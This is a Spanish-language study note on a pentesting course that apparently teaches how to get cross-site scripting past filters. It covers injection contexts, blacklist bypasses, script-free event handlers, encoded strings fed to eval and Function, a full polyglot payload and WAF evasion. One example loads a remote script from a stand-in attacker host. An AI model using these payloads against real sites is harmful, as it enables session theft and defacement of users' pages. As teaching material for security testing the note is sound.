---
tags:
  - Web/Red-Team
  - Pentesting
  - Pentesting/Explotacion
  - XSS
Fecha de actualización: 2026-06-08
Nota previa: "[[04 - Descubrimiento de XSS]]"
Nota siguiente: "[[06 - Herramientas para XSS]]"
Area: "[[XSS.base|XSS]]"
---
---

Un payload reflejado no es un payload ejecutado. Entre que la entrada se refleja y que el JavaScript corre hay dos obstáculos: el **contexto de inyección** donde aterriza tu entrada y los **filtros** (validación, blacklist, WAF) que la aplicación interpone. <mark style="background: #ADCCFFA6;">Evadir es adaptar el payload a ese contexto y a esos filtros para que el navegador acabe ejecutando tu código</mark>. Esta nota cubre los fundamentos; la evasión contra defensas modernas (WAF comerciales, `mXSS`, bypass de `DOMPurify`) se trata en [[06 - Evasión de filtros XSS y ofuscación]] del nivel avanzado.

# El contexto de inyección lo determina todo

El mismo payload funciona o falla según **dónde** se inserta tu entrada en la respuesta. Antes de escribir nada, localiza el reflejo en el código fuente (`CTRL+U`) o en el DOM renderizado (`CTRL+SHIFT+C`) e identifica el contexto:

| Contexto | Tu entrada aterriza en… | Para ejecutar hay que… |
| - | - | - |
| Cuerpo HTML | `<div>AQUÍ</div>` | Inyectar una etiqueta directamente (`<svg onload>`) |
| Atributo | `<input value="AQUÍ">` | Cerrar la comilla y la etiqueta: `"><svg onload=...>` |
| String de JavaScript | `var x = 'AQUÍ'` | Cerrar el string: `';alert(1)//` o `</script>` |
| URL / `href` | `<a href="AQUÍ">` | Usar el pseudo-protocolo `javascript:` |
| Comentario HTML | `<!-- AQUÍ -->` | Cerrar el comentario: `--><svg onload=...>` |

<mark style="background: #FF5582A6;">El primer paso de cualquier explotación es escapar del contexto actual</mark>: si tu entrada cae dentro de un atributo entre comillas dobles, ningún `<script>` ejecutará hasta que cierres ese `"` y la etiqueta que lo contiene. Lo confirmas mirando exactamente cómo se renderiza tu input y contando las comillas/corchetes que hay que cerrar.

> [!warning]+ El contexto JS es traicionero
> Si tu entrada está dentro de un `<script>` ya existente, **no necesitas** otra etiqueta `<script>` — necesitas romper el string o la sentencia: `'-alert(1)-'`, `'};alert(1);//`. Insertar `<script>` dentro de un `<script>` no anida; lo que ejecuta es cerrar el contexto y escribir JS válido. Vigila también las plantillas (`` `...${AQUÍ}...` ``), donde `${alert(1)}` ejecuta sin romper nada.

# Romper blacklists

Cuando la aplicación filtra por **lista negra** (bloquea `script`, `onerror`, `javascript:`…), su debilidad es que enumera lo que prohíbe en vez de validar lo que permite. Técnicas para saltarla:

- **Mayúsculas/minúsculas**: HTML y los nombres de evento son *case-insensitive*. Si el filtro solo bloquea minúsculas: `<ScRiPt>`, `<img src=x OnErRoR=alert(1)>`.
- **Anidamiento no recursivo**: si el filtro elimina `<script>` una sola vez, déjalo reconstruirse al borrarlo: `<scr<script>ipt>alert(1)</scr<script>ipt>`.
- **Separadores alternativos**: donde se espera un espacio, sirven `/`, tabuladores, saltos de línea o `%0a`: `<svg/onload=alert(1)>`, `<script/src=//evil.htb/x></script>`.
- **Caracteres de cierre inesperados**: muchos parsers aceptan `<` sin un cierre limpio. PortSwigger mantiene la referencia de qué acepta cada navegador en su [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), filtrable por etiqueta y evento.

# Ejecutar sin la etiqueta `<script>`

`innerHTML` y muchos filtros bloquean `<script>`, pero <mark style="background: #FFB86CA6;">los manejadores de evento y los pseudo-protocolos ejecutan JavaScript sin él</mark>. Es el arsenal que de verdad usas en la práctica:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
```

Las etiquetas `svg`, `math`, `details` o `marquee` suelen estar fuera de las blacklists clásicas pensadas para `img`/`script`. <mark style="background: #FFB8EBA6;">`autofocus`+`onfocus` y `ontoggle`/`onpageshow` disparan sin interacción del usuario</mark>, lo que importa cuando el payload debe ejecutar solo. El esquema `data:` permite incrustar HTML o base64 en atributos como el `data` de `<object>`: `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` — aunque su ejecución de JavaScript está muy restringida en Chrome/Firefox actuales (más fiable para incrustar HTML/SVG que para ejecutar JS directo).

# Strings sin comillas y código sin paréntesis

Cuando el filtro elimina comillas, sigues pudiendo construir strings; cuando elimina paréntesis, sigues pudiendo invocar. Estos primitivos son la base de la ofuscación:

```javascript
// Construir un string sin comillas
String.fromCharCode(97,108,101,114,116,40,49,41)   // "alert(1)"
/alert(1)/.source                                   // "alert(1)"
`alert(1)`                                           // template literal

// Codificaciones que el motor JS decodifica solo
"\x61\x6c\x65\x72\x74(1)"             // Hex (\x); Unicode (\uXXXX) funciona igual
"\141\154\145\162\164(1)"            // Octal (\NNN)
atob("YWxlcnQoMSk=")                  // Base64
```

Esos strings no hacen nada por sí solos: hay que pasarlos a un **`execution sink`** que acepte texto y lo ejecute. Los clásicos:

```javascript
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
```

<mark style="background: #8000E1A6;">Combinando un string ofuscado con un sink, evades filtros que solo buscan la cadena literal `alert`</mark>: `eval("\141\154\145\162\164\50\61\51")` o `Function(atob("YWxlcnQoMSk="))()`. Si además bloquean los paréntesis, existen colecciones específicas como [XSS without Parentheses](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md), que abusan de asignaciones a `onerror`/`location` y de `Reflect.apply`.

> [!info]+ Por qué funcionan las codificaciones
> Cada contexto tiene su decodificador propio, y el navegador lo aplica **antes** de que tu payload llegue al filtro o al motor. Las HTML entities (`&#x61;`, `&lt;`) se decodifican al parsear HTML; el percent-encoding (`%3C`), al resolver una URL; las secuencias `\x`/`\u`, dentro de un string de JavaScript. El truco está en codificar en la capa que el filtro no inspecciona pero el navegador sí revierte — y, a veces, en **doble codificación** cuando hay dos capas de decodificado en cadena.

# Polyglots

Un `polyglot` es un único payload diseñado para ejecutar en **varios contextos a la vez** (cuerpo HTML, atributo, comentario, string JS), ahorrándote probar uno por uno cuando no sabes dónde caerá tu entrada. El más conocido es el de Mathias Karlsson / Ashar Javed, que sobrevive a múltiples contextos rompiéndolos todos:

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

<mark style="background: #FFB8EBA6;">Un polyglot es ruidoso y fácil de detectar para un WAF</mark>; sirve para confirmar rápido que algo ejecuta, pero para un payload final discreto conviene un payload a medida del contexto real. PayloadsAllTheThings ([XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)) mantiene polyglots y rompe-contextos actualizados por la comunidad.

# WAF: la última capa

Un `Web Application Firewall` inspecciona las peticiones y bloquea las que coinciden con firmas de XSS conocidas (`<script>`, `onerror=`, `javascript:`). Es una capa de defensa, no una solución: <mark style="background: #FFB86CA6;">al trabajar con patrones, un WAF es evadible reescribiendo el payload para que no coincida con la firma pero siga siendo válido para el navegador</mark> — exactamente las técnicas de arriba (case, encoding, etiquetas y eventos poco comunes), más explotar las diferencias entre cómo parsea el WAF y cómo parsea el navegador. La evasión de WAFs comerciales modernos (Cloudflare, Akamai, Imperva), el `mutation XSS` y los bypass de sanitizadores como `DOMPurify` se desarrollan en [[06 - Evasión de filtros XSS y ofuscación]] del nivel avanzado.

Con el payload capaz de atravesar contexto y filtros, el siguiente paso es **automatizar** su descubrimiento y validación con el instrumental adecuado: [[06 - Herramientas para XSS]].

> [!info]+ Fuentes de referencia
> - [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) — etiquetas y eventos filtrables por navegador, la referencia viva más usada.
> - [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) — catálogo histórico de bypass.
> - [HTML5 Security Cheatsheet (html5sec.org)](https://html5sec.org/) — vectores específicos de navegador, mantenido por Mario Heiderich.
> - [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) — polyglots y rompe-contextos de la comunidad.
